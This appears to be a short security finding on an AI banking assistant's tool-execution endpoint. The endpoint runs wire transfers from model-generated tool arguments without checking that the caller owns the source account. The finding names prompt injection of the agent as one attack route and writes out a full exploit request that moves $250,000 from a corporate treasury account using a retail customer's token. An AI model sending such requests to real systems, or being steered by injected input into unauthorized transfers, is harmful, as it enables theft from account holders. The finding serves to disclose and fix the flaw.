diagnosis: The AI agent tool execution endpoint receives LLM function call arguments and executes wire transfers via bankingService.dispatchWire. The dispatcher assumes that because the user is authenticated, the tool arguments generated by the model or forwarded from the chat client are authorized. An attacker can prompt-inject the agent or submit crafted toolArguments specifying another client's sourceAccountId to initiate unauthorized wire transfers and drain accounts.
exploit_request:
POST /api/agent/tools/execute HTTP/1.1
Host: ai-assistant.fintechbank.com:8111
Authorization: Bearer <retail_customer_jwt>
Content-Type: application/json

{"toolName": "executeWireTransfer", "toolArguments": {"sourceAccountId": "acc_corporate_treasury_9001", "destinationRouting": "121000358", "destinationAccount": "9940128841", "amountCents": 25000000}}
